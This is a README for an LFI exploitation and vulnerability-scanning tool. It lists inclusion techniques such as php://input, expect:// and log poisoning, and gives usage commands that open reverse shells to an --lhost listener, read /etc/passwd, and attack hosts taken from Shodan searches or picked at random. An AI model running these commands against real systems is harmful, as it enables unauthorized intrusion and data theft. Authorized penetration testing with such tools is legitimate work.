# 🚀 Liffy Ultimate Unified

**The Complete LFI Exploitation & Vulnerability Testing Tool**

Combines all features from the original Liffy tool with modern URL gathering, XSS testing, SQL injection testing, and advanced LFI exploitation techniques.

## ✨ Features

### 🎯 **URL Gathering & Target Discovery**
- **Shodan Integration**: Search for targets using Shodan queries
- **Historical URL Discovery**: Wayback Machine, Common Crawl, OTX integration
- **Random Target Selection**: Pull random targets from scope directory
- **Subdomain Enumeration**: Comprehensive subdomain discovery
- **Parameter Analysis**: Intelligent parameter extraction and analysis

### 🔓 **LFI Exploitation Techniques**
- **data://** - Base64 encoded payload execution
- **php://input** - POST data inclusion
- **expect://** - Command execution via expect
- **/proc/self/environ** - Environment variable inclusion
- **Log Poisoning** - Apache access logs and SSH auth logs
- **php://filter** - File reading with base64 encoding
- **zip://** - ZIP file inclusion (new)
- **phar://** - PHAR file inclusion (new)
- **compress.zlib://** - Compressed file inclusion (new)
- **Auto-Detection** - Automatic technique selection

### 🧪 **Vulnerability Testing**
- **XSS Testing**: Using airixss tool
- **SQL Injection Testing**: Using jeeves tool
- **Parameter Discovery**: Using GF patterns
- **Payload Testing**: Using qsreplace with comprehensive payload lists

### 🚀 **Performance & Usability**
- **Parallel Processing**: Multi-threaded URL analysis and testing
- **Auto-Detection**: Automatic IP and port detection
- **Modern UI**: Beautiful terminal interface with progress bars
- **Comprehensive Logging**: Detailed logging and result saving
- **Easy Setup**: One-command installation and setup

## 🛠️ Installation

### Quick Setup
```bash
# Clone the repository
git clone <repository-url>
cd liffy

# Run setup script
chmod +x setup.sh
./setup.sh

# Or use Makefile
make install
```

### Manual Setup
```bash
# Install Python dependencies
pip3 install -r requirements.txt

# Install Go tools
go install github.com/Anon-Exploiter/sqry@latest
go install github.com/bp0lr/gauplus@latest
go install github.com/ferreiraklet/airixss@latest
go install github.com/ferreiraklet/jeeves@latest
go install github.com/tomnomnom/qsreplace@latest
go install github.com/tomnomnom/gf@latest

# Setup scope directory
mkdir -p ~/targets/scope
echo "example.com" > ~/targets/scope/inscope.txt

# Make executable
chmod +x liffy_ultimate_unified.py
```

## 🎯 Usage

### Single Target Mode
```bash
# Basic LFI exploitation
liffy --url "http://target/file.php?page=" --data --lhost 192.168.1.100 --lport 4444

# Auto-detect IP and port
liffy --url "http://target/file.php?page=" --data --auto-ip --auto-port

# Different techniques
liffy --url "http://target/file.php?page=" --input --auto-ip --auto-port
liffy --url "http://target/file.php?page=" --filter --file /etc/passwd
liffy --url "http://target/file.php?page=" --auto --auto-ip --auto-port
```

### Multi-Target Mode
```bash
# Random targets from scope
liffy --random --test-mode all --auto-ip --auto-port

# Specific domain testing
liffy --domain example.com --test-mode lfi --auto-ip --auto-port

# Shodan search
liffy --shodan-query "apache" --test-mode lfi --auto-ip --auto-port

# XSS testing only
liffy --domain example.com --test-mode xss

# SQL injection testing only
liffy --domain example.com --test-mode sqli
```

### Advanced Options
```bash
# Custom scope count
liffy --random --random-count 10 --test-mode all

# Shodan with filters
liffy --shodan-query "apache" --country US --ports "80,443" --test-mode lfi

# Custom output file
liffy --domain example.com --test-mode all --output results.json

# Verbose output
liffy --domain example.com --test-mode all --verbose

# Disable specific tools
liffy --domain example.com --test-mode all --no-airixss --no-jeeves
```

## 📁 File Structure

```
liffy/
├── liffy_ultimate_unified.py    # Main unified tool
├── core.py                      # Original Liffy core techniques
├── shell_generator.py           # Shell generation utilities
├── msf.py                       # Metasploit integration
├── http_server.py               # HTTP server for stager
├── random                       # Random target selector
├── setup.sh                     # Setup script
├── Makefile                     # Build automation
├── requirements.txt             # Python dependencies
└── README_ULTIMATE_UNIFIED.md   # This file
```

## 🔧 Configuration

### Scope Directory
Add your targets to `~/targets/scope/`:
```bash
# Create scope files
echo "example.com" > ~/targets/scope/inscope.txt
echo "*.example.com" >> ~/targets/scope/inscope.txt
echo "https://api.example.com" >> ~/targets/scope/inscope.txt
```

### Environment Variables
```bash
# Optional: Set custom paths
export LIFFY_SCOPE_DIR="/path/to/scope"
export LIFFY_OUTPUT_DIR="/path/to/output"
```

## 🎨 Examples

### Example 1: Quick Random Testing
```bash
# Test 5 random targets for all vulnerabilities
liffy --random --test-mode all --auto-ip --auto-port
```

### Example 2: Domain-Specific LFI Testing
```bash
# Test specific domain for LFI vulnerabilities
liffy --domain vuln.example.com --test-mode lfi --auto-ip --auto-port
```

### Example 3: Shodan Search with LFI Testing
```bash
# Search Shodan for Apache servers and test for LFI
liffy --shodan-query "apache" --test-mode lfi --auto-ip --auto-port
```

### Example 4: Comprehensive Testing
```bash
# Test domain for all vulnerability types
liffy --domain example.com --test-mode all --verbose --output results.json
```

## 🛡️ Security Notes

- **Authorized Testing Only**: Only use on systems you own or have explicit permission to test
- **Legal Compliance**: Ensure compliance with local laws and regulations
- **Responsible Disclosure**: Report vulnerabilities responsibly
- **Data Protection**: Be mindful of sensitive data during testing

## 🔍 Troubleshooting

### Common Issues

**1. Go tools not found**
```bash
# Ensure Go is installed and GOPATH is set
export GOPATH="$HOME/go"
export PATH="$GOPATH/bin:$PATH"
```

**2. Python dependencies missing**
```bash
# Install requirements
pip3 install -r requirements.txt
```

**3. Scope directory not found**
```bash
# Create scope directory
mkdir -p ~/targets/scope
echo "example.com" > ~/targets/scope/inscope.txt
```

**4. Permission denied**
```bash
# Make scripts executable
chmod +x liffy_ultimate_unified.py
chmod +x random
```

### Debug Mode
```bash
# Run with verbose output for debugging
liffy --domain example.com --test-mode all --verbose
```

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🙏 Acknowledgments

- **rotlogix** - Original Liffy creator
- **unicornFurnace** - Enhanced features and modernization
- **Community** - Bug reports, feature requests, and contributions

## 📞 Support

- **Issues**: Report bugs and request features via GitHub issues
- **Documentation**: Check this README and inline help (`liffy --help`)
- **Community**: Join discussions in the repository

---

**Happy Hunting! 🎯**

*Remember: With great power comes great responsibility. Use this tool ethically and legally.*